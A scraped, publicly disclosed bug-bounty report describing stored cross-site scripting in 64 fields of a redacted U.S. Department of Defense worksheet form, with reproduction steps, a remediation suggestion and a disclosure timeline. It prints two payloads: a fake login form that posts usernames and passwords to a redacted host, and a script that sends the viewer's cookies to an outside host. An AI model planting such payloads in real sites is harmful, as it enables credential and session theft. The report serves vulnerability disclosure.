---
title: Stored XSS via 64(?) vulnerable fields leads to credential theft/account takeover (U.S. Dept Of Defense, Report #847176)
author: z32 (un4gi)
url: https://hackerone.com/reports/847176
date_published: 2020-04-11 (disclosed 2021-02-10)
date_scraped: 2026-11-16
platform: hackerone
disclosed_report: https://hackerone.com/reports/847176
bounty: not stated (DoD VDP, Hidden)
vuln_class: xss
---

<!-- Raw scraped text below. Public, non-paywalled content only.
     This file is source material, never copied into skills verbatim. -->

Reported to: U.S. Dept Of Defense (VDP). Reported by: z32 (signs as @un4gi). Reported on: April 11, 2020, 8:39am UTC. Status: Resolved (Jan 26, 2021). Severity: High (7 ~ 8.9). Weakness: Cross-site Scripting (XSS) - Stored. Disclosed: February 10, 2021. Target host and form names are redacted by DoD (shown as block characters in the source).

## Summary

A user is able to complete a [redacted] worksheets via [redacted URL]. This form allows a user to store multiple XSS payloads within, which will in turn allow the attacker to run malicious code in context of the legal personnel who view the request.

## Impact

The attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.

## Step-by-step Reproduction Instructions

1. Browse to https://[redacted]
2. Click `[redacted]`. Once on the [redacted] page, click `[redacted] and [redacted]`
3. Click `Continue`.
4. Fill in your name and click `Submit`. XSS payloads seem to be sanitized properly here from basic tests.
5. Any field that accepts text in the rest of the document seems vulnerable to XSS. Complete the form, filling in XSS payloads anywhere you can type. I counted 64 vulnerable fields total.
6. Click `Finish`. You will see a confirmation that your request was submitting and receive a ticket number.
7. Click `[redacted]`, or return to the `[redacted]` page and put in your info in the `[redacted]` area to modify the worksheet. The XSS will fire in both locations.
8. To demonstrate credential theft/account takeover, I used the following (very obvious) payload. There are various ways an attacker could do this and nothing seems to be filtered:

```html
<h3>Please login to proceed</h3> <form action=http://[redacted]>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
```

An attacker can also redirect the user as soon as the worksheet is opened, but as an unauthenticated user I was unable to test for cookie theft:

`<script>window.location="http://[redacted]/?cookie=" + document.cookie</script>`

## Suggested Mitigation/Remediation Actions

Sanitize any fields where user input is reflected and disallow special characters from being submitted in each form field.

## Impact

The attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.

## Timeline

- Apr 11, 2020: DoD bot posted the standard VDP greeting. z32 asked to add @sheepkiller as participant.
- Apr 13, 2020: agent-r5 updated severity to high and changed status to Triaged ("We have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.").
- Jan 26, 2021: agent-j5 (DoD staff) closed as Resolved.
- Feb 5/10, 2021: z32 asked for disclosure with redaction of the IP/host; agent-l8: "In the comments drop down hit request disclosure- and it gets thrown into our queue. Usually takes ~ 1 week to review/redact/release." Feb 10, 2021 ag3nt-j1 agreed to disclose; report disclosed and locked.

## Metadata

Report Id #847176. Participants: z32, ag3nt-j1, agent-j5, agent-l8, agent-r5, sheepkiller. CVE ID: None. Bounty: Hidden.
